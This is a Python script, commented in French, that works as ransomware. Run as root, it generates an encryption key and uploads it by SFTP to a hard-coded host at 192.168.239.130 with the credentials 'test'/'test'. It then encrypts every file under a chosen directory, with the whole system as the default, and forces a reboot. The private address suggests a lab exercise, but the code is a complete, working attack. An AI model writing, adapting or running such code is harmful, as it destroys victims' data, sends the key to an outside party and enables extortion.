import os
import socket
import subprocess
import sys
import paramiko
from cryptography.fernet import Fernet


def check_root():
    """Vérifie si le script est exécuté en tant que root."""
    if os.geteuid() != 0:
        print("Ce script doit être exécuté en tant que root.")
        sys.exit(1)


def generate_key():
    """Génère et enregistre une clé de chiffrement."""
    key = Fernet.generate_key()
    try:
        with open("/root/secret.key", "wb") as key_file:
            key_file.write(key)
        os.chmod("/root/secret.key", 0o600)  # Restreint les permissions du fichier de clé
        return key
    except IOError as e:
        print(f"Erreur lors de la création du fichier de clé: {e}")
        sys.exit(1)


def load_key():
    """Charge la clé de chiffrement."""
    if not os.path.exists("/root/secret.key"):
        print("Erreur: Le fichier de clé /root/secret.key n'existe pas")
        sys.exit(1)
    try:
        with open("/root/secret.key", "rb") as key_file:
            return key_file.read()
    except IOError as e:
        print(f"Erreur lors de la lecture du fichier de clé: {e}")
        sys.exit(1)


def send_key_to_sftp(key):
    """Envoie la clé de chiffrement au serveur SFTP avec gestion d'erreur améliorée."""
    sftp_host = "192.168.239.130"
    sftp_port = 22
    sftp_username = "test"
    sftp_password = "test"
    remote_path = "/secret.key"
    timeout_seconds = 10

    transport = None
    sftp = None

    try:
        print(f"Tentative de connexion à SFTP {sftp_host}:{sftp_port}...")

        # Création du transport avec timeout
        transport = paramiko.Transport((sftp_host, sftp_port))
        transport.banner_timeout = timeout_seconds
        transport.connect(username=sftp_username, password=sftp_password)

        # Création du client SFTP
        sftp = paramiko.SFTPClient.from_transport(transport)

        # Sauvegarde de la clé dans un fichier temporaire
        temp_key_path = "/root/secret.key.tmp"
        try:
            with open(temp_key_path, "wb") as f:
                f.write(key)

            # Envoi du fichier vers le serveur SFTP
            sftp.put(temp_key_path, remote_path)
            print(f"Clé envoyée avec succès à {sftp_host}:{remote_path}")
        finally:
            # Suppression du fichier temporaire
            if os.path.exists(temp_key_path):
                os.remove(temp_key_path)

    except paramiko.SSHException as ssh_err:
        print(f"Erreur SSH lors de la connexion: {ssh_err}")
    except socket.timeout:
        print(f"Timeout: Le serveur SFTP n'a pas répondu dans les {timeout_seconds} secondes")
    except Exception as e:
        print(f"Erreur inattendue lors de l'envoi de la clé via SFTP: {e}")
    finally:
        # Fermeture propre des connexions
        if sftp:
            sftp.close()
        if transport:
            transport.close()


def encrypt_file(file_path, cipher):
    """Chiffre un fichier en remplaçant son contenu."""
    try:
        # Vérifie que c'est un fichier standard
        if not os.path.isfile(file_path) or os.path.islink(file_path):
            return

        with open(file_path, "rb") as file:
            data = file.read()
        encrypted_data = cipher.encrypt(data)
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
    except (IOError, PermissionError) as e:
        print(f"[ERREUR] Impossible de chiffrer {file_path}: {e}")


def decrypt_file(file_path, cipher):
    """Déchiffre un fichier en restaurant son contenu original."""
    try:
        # Vérifie que c'est un fichier standard
        if not os.path.isfile(file_path) or os.path.islink(file_path):
            return

        with open(file_path, "rb") as file:
            encrypted_data = file.read()
        decrypted_data = cipher.decrypt(encrypted_data)
        with open(file_path, "wb") as file:
            file.write(decrypted_data)
    except (IOError, PermissionError) as e:
        print(f"[ERREUR] Impossible de déchiffrer {file_path}: {e}")


def process_directory(directory, cipher, encrypt=True):
    """Parcourt un dossier et chiffre/déchiffre chaque fichier tout en évitant les fichiers critiques du système."""
    system_exclude = ["/proc", "/sys", "/dev", "/run", "/tmp", "/boot", "/root/secret.key"]

    if not os.path.exists(directory):
        print(f"Erreur: Le répertoire {directory} n'existe pas")
        return

    for root, _, files in os.walk(directory):
        if any(root.startswith(excl) for excl in system_exclude):
            continue

        for file in files:
            file_path = os.path.join(root, file)
            try:
                if encrypt:
                    encrypt_file(file_path, cipher)
                else:
                    decrypt_file(file_path, cipher)
                print(f"{'Chiffré' if encrypt else 'Déchiffré'} : {file_path}")
            except Exception as e:
                print(f"[ERREUR] sur {file_path}: {e}")


def restart_system():
    """Redémarre le système après chiffrement."""
    print("Redémarrage du système dans 10 secondes...")
    try:
        subprocess.run(["shutdown", "-r", "now"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Erreur lors du redémarrage: {e}")


if __name__ == "__main__":
    try:
        check_root()
        directory = input("Entrez le chemin du dossier à traiter (/ pour tout le système) : ").strip()
        if not directory:
            directory = "/"  # Valeur par défaut si rien n'est entré

        action = input("Tapez 'E' pour chiffrer ou 'D' pour déchiffrer : ").strip().upper()
        while action not in ['E', 'D']:
            print("Action non reconnue. Veuillez choisir 'E' ou 'D'.")
            action = input("Tapez 'E' pour chiffrer ou 'D' pour déchiffrer : ").strip().upper()

        if action == 'E':
            key = generate_key()
            send_key_to_sftp(key)
        else:
            key = load_key()

        cipher = Fernet(key)
        process_directory(directory, cipher, encrypt=(action == 'E'))

        if action == 'E':
            restart_system()
    except KeyboardInterrupt:
        print("\nOpération annulée par l'utilisateur")
        sys.exit(1)
    except Exception as e:
        print(f"Erreur inattendue: {e}")
        sys.exit(1)